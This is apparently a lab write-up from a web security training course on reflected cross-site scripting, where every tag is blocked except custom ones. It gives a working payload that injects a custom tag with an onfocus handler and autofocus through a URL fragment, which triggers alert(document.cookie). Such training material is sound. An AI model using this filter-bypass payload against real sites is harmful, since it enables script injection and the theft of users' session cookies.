## Reflected XSS into HTML context with all tags blocked except custom ones

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alertsdocument.cookie.

### Solution Steps
1. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
2. Click "Store" and "Deliver exploit to victim".

### Key Payloads
- `document.cookie`
- `YOUR-LAB-ID`
- `<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>`
- `onfocus`
- `alert`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_reflected

---
*Source: PortSwigger Web Security Academy*
